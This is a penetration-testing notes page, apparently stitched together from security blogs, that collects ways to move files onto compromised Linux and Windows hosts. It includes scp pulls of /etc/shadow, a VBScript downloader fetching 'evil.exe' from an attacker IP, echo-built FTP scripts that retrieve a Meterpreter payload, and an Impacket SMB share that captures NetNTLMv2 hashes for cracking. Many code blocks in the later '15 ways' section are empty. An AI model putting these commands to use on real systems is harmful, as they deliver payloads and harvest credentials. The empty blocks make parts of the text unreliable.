# Transfering files & Data

## Transfering Files

#### One line HTTP Servers

[https://gist.github.com/willurd/5720255](https://gist.github.com/willurd/5720255)

**Ncat:**

ncat -k -l -p 1337 -c "printf 'HTTP/1.1 200 OK\r\n\r\n'; cat ~/evil.html"

**Python:**

`python3 -m http.server 1337`

`python2 -m SimpleHTTPServer 1337`

**PHP:**

`$ php -S localhost:8000 -t evil/`

#### Transfer methods

In the very same way it can be used to transfer files between two computers. You can create a server that serves the file with the following:

**SCP - Secure Copy**

scp username1@source\_host:directory1/filename1

`scp root@192.168.99.22:/etc/passwd .`

`scp root@192.168.99.22:/etc/shadow .`

**Netcat**

On the receiving machine: `nc -lvnp [port] > outfile`

On the sending machine: `nc [ip address of receiver] [port] < infile` or `cat backup.iso | nc -l 3333`

**Python Simple HTTP Server**

`python -m SimpleHTTPServer 1234`

`python3 -m http.server`

* Run a ruby webrick basic http server

  ruby -rwebrick -e "WEBrick::HTTPServer.new

  \(:Port =&gt; 80, :DocumentRoot =&gt; Dir.pwd\).start"

  * Run a basic PHP http server

    php -S $ip:80

* HTTP Put

  nmap -p80 $ip --script http-put --script-args

  http-put.url='/test/sicpwn.php',http-put.file='/var/www/html/sicpwn.php

**Apache webserver**

In Kali Linux apache is installed. Copy the file in `/var/www/html`/ and start the webserver with `service apache2`

`start`. On the taget machine download the file with a browser or wget.

**FTP server**

The `pytftpd`library, like the HTTP one above, lets you spin up a Python FTP server in one line. It doesn't come installed by default, but you can install it with apt: `apt-get install python-pyftpdlib`

`Start with python -m pyftpdlib -p 21`

**Metasploit FTP**

There is also an auxiliary FTP server built in to Metasploit as well that is easy to deploy and configure. It's located at `uxiliary/server/ftp`. Set the `FTPROOT`to the directory you want to share and run `exploit`

`msf > use auxiliary/server/ftp` The server will run in the background. Kill it with `jobs -k <id>`

#### File Transfer Methods — Windows <a id="dda8"></a>

If you’re attacking windows, transferring files can be a little more tricky. My favourite method \(which I learned from the OSCP manual!\) is to create your own Windows wget by writing a VBS script. First you can create the file line by line by running these commands:

```text
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

Then, using your script looks something like this:

```text
cscript wget.vbs http://attackerip/evil.exe evil.exe
```

**Creating a wget VB Script on Windows:**

```text
\[\*https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt\*\]\(https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt\)
```

Windows file transfer script that can be pasted to the command line. File transfers to a Windows machine can be tricky without a Meterpreter shell. The following script can be copied and pasted into a basic windows reverse and used to transfer files from a web server \(the timeout 1 commands are required after each new line\):

```text
     echo Set args = Wscript.Arguments  &gt;&gt; webdl.vbs
     timeout 1
     echo Url = "http://1.1.1.1/windows-privesc-check2.exe"  &gt;&gt; webdl.vbs
     timeout 1
     echo dim xHttp: Set xHttp = createobject\("Microsoft.XMLHTTP"\)  &gt;&gt; webdl.vbs
     timeout 1
     echo dim bStrm: Set bStrm = createobject\("Adodb.Stream"\)  &gt;&gt; webdl.vbs
     timeout 1
     echo xHttp.Open "GET", Url, False  &gt;&gt; webdl.vbs
     timeout 1
     echo xHttp.Send  &gt;&gt; webdl.vbs
     timeout 1
     echo with bStrm      &gt;&gt; webdl.vbs
     timeout 1
     echo     .type = 1 '      &gt;&gt; webdl.vbs
     timeout 1
     echo     .open      &gt;&gt; webdl.vbs
     timeout 1
     echo     .write xHttp.responseBody      &gt;&gt; webdl.vbs
     timeout 1
     echo     .savetofile "C:\temp\windows-privesc-check2.exe", 2 '  &gt;&gt; webdl.vbs
     timeout 1
     echo end with &gt;&gt; webdl.vbs
     timeout 1
     echo

  The file can be run using the following syntax:
  \`C:\temp\cscript.exe webdl.vbs\`
```

If you’re attacking a windows box and this method isn’t going to work for you, consider trying TFTP or SMB as alternate file transfer methods. If you’re lucky, there may also be a file upload method in a web application.

**Downloading the files**

As mentioned earlier, Windows has an FTP client built in to the PATH. You can open an FTP connection and download the files directly from Kali on the command line. Authenticate with user`anonymous`and any password

![Windows FTP Interactive](https://blog.ropnop.com/content/images/2016/06/windows_ftp_get.png)

Now this is great if you have an interactive shell where you can actually drop into the FTP prompt and issue commands, but it's not that useful if you just have command injection and can only issue one command at a time.

Fortunately, windows FTP can take a "script" of commands directly from the command line. Which means if we have a text file on the system that contains this:

```text
open 10.9.122.8  
anonymous  
whatever  
binary  
get met8888.exe  
bye
```

we can simply run`ftp -s:ftp_commands.txt`and we can download a file with no user interaction.

How to get that text file? We can echo into it one line at at time:

```text
C:\Users\jarrieta\Desktop>echo open 10.9.122.8>ftp_commands.txt  
C:\Users\jarrieta\Desktop>echo anonymous>>ftp_commands.txt  
C:\Users\jarrieta\Desktop>echo whatever>>ftp_commands.txt  
C:\Users\jarrieta\Desktop>echo binary>>ftp_commands.txt  
C:\Users\jarrieta\Desktop>echo get met8888.exe>>ftp_commands.txt  
C:\Users\jarrieta\Desktop>echo bye>>ftp_commands.txt  
C:\Users\jarrieta\Desktop>ftp -s:ftp_commands.txt
```

Or, do it all in one long line:

```text
C:\Users\jarrieta\Desktop>echo open 10.9.122.8>ftp_commands.txt&echo anonymous>>ftp_commands.txt&echo password
>>ftp_commands.txt&echo binary>>ftp_commands.txt&echo get met8888.exe>>ftp_commands.txt&echo bye>>
ftp_commands.txt&ftp -s:ftp_commands.txt
```

Either way you'll end up with`met8888.exe`on the Windows host.

### SMB <a id="smb"></a>

This is actually my favorite method to transfer a file to a Windows host. SMB is built in to Windows and doesn't require any special commands as Windows understands UNC paths. You can simply use the standard`copy`and`move`commands and SMB handles the file transferring automatically for you. What's even better is Windows will actually let you\_execute files\_via UNC paths, meaning you can download and execute a payload in one command!

**Setting up the Server**

Trying to get Samba set up and configured properly on Linux is a pain. You have to configure authentication, permissions, etc and it's quite frankly way overkill if I just want to download one file. Now Samba an actually do some [really](http://passing-the-hash.blogspot.com/2016/06/nix-kerberos-ms-active-directory-fun.html)[cool](http://passing-the-hash.blogspot.com/2016/06/im-pkdc-your-personal-kerberos-domain.html) stuff when you configure it to play nicely with Windows AD, but most of the time I just want a super simple server up and running that accepts any authentication and serves up or accepts files.

Enter`smbserver.py`, part of the [Impacket](https://github.com/CoreSecurity/impacket) project. Maybe one day I'll write a blogpost without mentioning Impacket, but that day is not today.

To launch a simple SMB server on port 445, just specify a share name and the path you want to share:

```text
# python smbserver.py ROPNOP /root/shells
```

The python script takes care of all the configurations for you, binds to 445, and accepts any authentication. It will even print out the hashed challenge responses for any system that connects to it.

![Impacket&apos;s smbserver.py](https://blog.ropnop.com/content/images/2016/07/python_smbserver.png)

In one line we've got an SMB share up and running. You can confirm it with`smbclient`from Linux:  
![smbclient locally](https://blog.ropnop.com/content/images/2016/07/smbclient_local-1.png)

Or with`net view`from Windows:

![net view from Windows](https://blog.ropnop.com/content/images/2016/07/netview_windows.png)

**Copying the Files**

Since Windows handles UNC paths, you can just treat the`ROPNOP`share as if it's just a local folder from Windows. Basic Windows file commands like`dir`,`copy`,`move`, etc all just work:

![Windows dir](https://blog.ropnop.com/content/images/2016/07/windows_dir.png)

![Windows copy](https://blog.ropnop.com/content/images/2016/07/windows_copy.png)

If you look at the output from`smbserver.py`, you can see that every time we access the share it outputs the NetNTLMv2 hash from the current Windows user. You can feed these into John or Hashcat and crack them if you want \(assuming you can't just elevate to System and get them from Mimikatz\)

![Captured user hash](https://blog.ropnop.com/content/images/2016/07/captured_hash_smb.png)

**Executing files from SMB**. Because of the way Windows treats UNC paths, it's possible to just execute our binary directly from the SMB share without even needing to copy it over first. Just run the executable as if it were already local and the payload will fire:

![Payload through SMB](https://blog.ropnop.com/content/images/2016/07/meterpreter_payload.png)

## 15 Ways to Download a File

Ryan Gandrud, June 16th, 2014

Pentesters often upload files to compromised boxes to help with privilege escalation, or to maintain a presence on the machine. This blog will cover 15 different ways to move files from your machine to a compromised system. It should be interesting for penetration testers who have a presence on a box and need post-exploitation options, and system admins that just want to move files.

There are many other ways to move files onto machines during pentests, but this list includes some of my favorites. Below is a summary of the file transfer techniques that will covered in this blog.

1. [PowerShell file download](https://blog.netspi.com/15-ways-to-download-a-file/#powershell)
2. [Visual Basic file download](https://blog.netspi.com/15-ways-to-download-a-file/#visual)
3. [Perl file download](https://blog.netspi.com/15-ways-to-download-a-file/#perl)
4. [Python file download](https://blog.netspi.com/15-ways-to-download-a-file/#python)
5. [Ruby file download](https://blog.netspi.com/15-ways-to-download-a-file/#ruby)
6. [PHP file download or upload](https://blog.netspi.com/15-ways-to-download-a-file/#php)
7. [FTP file download](https://blog.netspi.com/15-ways-to-download-a-file/#ftp)
8. [TFTP file download](https://blog.netspi.com/15-ways-to-download-a-file/#tftp)
9. [Bitsadmin file download](https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin)
10. [Wget file download](https://blog.netspi.com/15-ways-to-download-a-file/#wget)
11. [Netcat file download](https://blog.netspi.com/15-ways-to-download-a-file/#netcat)
12. [Windows share file download](https://blog.netspi.com/15-ways-to-download-a-file/#windows)
13. [Notepad dialog box file download](https://blog.netspi.com/15-ways-to-download-a-file/#notepad)
14. [Exe to Text, Text to EXE with PowerShell and Nishang](https://blog.netspi.com/15-ways-to-download-a-file/#exe)
15. [Csc.exe to compile from source file](https://blog.netspi.com/15-ways-to-download-a-file/#csc)

_**Note:** Many of the techniques listed should also be considered as options when executing commands through SQL injection. For the multi-line steps, ECHO the commands to a file, and then execute the file._

### PowerShell File Download

PowerShell is one of those scripting languages that can be overlooked as a threat by administrators. However, it can provide a plethora of options and capabilities to someone who knows how to use it. The biggest benefit is that it is native to Windows since Windows Server 2003. Below is an example of a simple script that can be used to download a file to the local file system from a webserver on the internet:

```text

```

To execute this script, run the following command in a PowerShell window:

```text
PS C:> .test.ps1
```

Sometimes, the PowerShell execution policy is set to restricted. In this case, you will not be able to execute commands or scripts through PowerShell… unless you just set it to unrestricted using the following command:

```text
C:>powershell set-executionpolicy unrestricted
```

### Visual Basic File Download

The final version of Visual Basic has come standard on Windows machines since 1998. The following script can download a file of your choosing. However, the script is quite larger than the PowerShell one.

```text

```

Cscript is a command line Windows Script Host that allows you to pass command line options and allows you to set script properties. It is not necessary to use this to run a vbs script in Windows 7 and possibly others, but using it allows your scripts to run on Windows XP machines and above.

To execute this script, run the following command in a command shell:

```text
C:>cscript test.vbs
```

The following four languages are non-native to windows machines. However, if you find a machine with any of these languages installed on them \(regardless of the OS\), you can leverage these scripts to download files.

### Perl File Download

Perl is an extremely versatile scripting language that can be used for almost anything. Using Perl makes it super easy to download files onto the local host.

```text

```

To execute this script, run the following command in a command shell:

```text
root@kali:~# perl test.pl
```

### Python File Download

Python is a general purpose scripting language that emphasizes code readability. As with most scripting languages, the goal is to write less code than needed for a programming language, while still accomplishing the intended task.

```text

```

To execute this script, run the following command in a command shell:

```text
root@kali:~# python test.py
```

### Ruby File Download

Ruby is an object-oriented programming language that can be used for many things from creating frameworks \(think Metasploit\) to simple tasks such as downloading files.

```text

```

To execute this script, run the following command in a command shell:

```text

```

### PHP File Download

PHP is usually a server-side scripting language used for web development, but can also be used as a general purpose scripting language.

```text

```

To execute this script, run the following command in a command shell:

```text

```

The remaining ways to move files onto a target machine are through native operating system functions unless otherwise noted. Some of these require more steps than others, but can be used in different scenarios to bypass certain restrictions.

### FTP File Download

For this method, an attacker would want to echo the FTP commands to a bash script since it generally requires user interaction to input a username and password. This bash script can then be run to have all the steps ran without the need for interaction.

```text

```

### TFTP File Download

Trivial FTP comes by default in Windows Vista and below. Note that you will have to set up the corresponding server to connect to. It can be run using the following command:

```text

```

### Bitsadmin File Download

Bitsadmin is a command-line tool for windows that allows a user to create download or upload tasks.

```text

```

### Wget File Download

Wget is a Linux and Windows tool that allows for non-interactive downloads.

```text

```

### Netcat File Download

Netcat can allow for downloading files by connecting to a specific listening port that will pass the contents of a file over the connection. Note that this example is Linux specific.

On the attackers computer, type:

```text

```

This will print the contents of the file to the local port 1234. Then, whenever someone connects to that port, the contents of the file will be sent to the connecting IP.

The following command should be run on the machine the attacker is targeting:

```text

```

This will connect the target to the attacker’s computer and receive the file that will be sent over the connection.

### Windows Share File Download

Windows shares can be mounted to a drive letter, and files can then be copied over by subsequent copy commands.

To mount a remote drive, type:

```text
Mount NFS share to /mnt/nfs
mount $ip:/vol/share /mnt/nfs
```

### Notepad Dialog Box File Download

If you have access \(RDP, physical, etc.\) to a machine, but your user permissions do not allow you to open a web browser, this is a trick you can use to quickly download a file from a URL or a Universal Naming Convention \(UNC\) path. This also works well when you are breaking out of a locked-down application being run on a terminal.

1. Open notepad
2. Go to file – open
3. In the File Name box near the bottom, type in the full URL path to your file

[![](https://blog.netspi.com/wp-content/uploads/2014/06/RG_Download_File.png)](https://blog.netspi.com/wp-content/uploads/2014/06/RG_Download_File.png)

Notepad is kind enough to go out and grab the contents of this file for you.

### Exe to Txt, and Txt to Exe with PowerShell and Nishang

This is possibly one of my favorite tools to use when trying to move an exe to a machine. Nishang allows you to convert an exe to hex, then reassemble the hex into the original exe using PowerShell. I have seen group policies that do not allow for the transfer of exes through the RDP clipboard. Although it provides basic protection, it \(sometimes\) still allows the ability to copy text through the clipboard. In this scenario, you would be able to copy across the Nishang PowerShell source to a file on the box and rename the extension to .ps1. The Nishang script you want to copy is TexttoExe.ps1, and it is only 8 lines long. You can download Nishang here.

To convert the exe to a hex file, type:

```text

```

Open the evil.txt file and copy the contents. Then paste the contents to the target machine using the RDP clipboard. Do the same with the contents of the TexttoExe.ps1 file in Nishang.

To convert the hex file back to an exe, type:

```text

```

This will result in your evil exe being successfully moved to the target machine.

### Csc.exe to Compile Source from a File

C sharp compiler \(csc\) is the command line compiler included with Microsoft .NET installations within Windows. This could be useful if you are unable to copy over an executable file, but can still copy over text. Using this method, combined with SQL injection, can move an exe to a box without having to try to bypass egress filters or authenticated proxies that might block outbound connectivity.

The default location for this executable is the following:

```text

```

Using the following example code, the compiled executable will use cmd.exe to query the local users on the box and write the results to a file in the C:Temp directory. This could obviously be modified to interact with different exe’s on the box, or completely re-written to use your own exploit code.

```text

```

To compile your source code, type:

```text

```

### Wrap up

Hopefully this blog has given you viable options for getting your files \(malicious or otherwise\) over to a server.

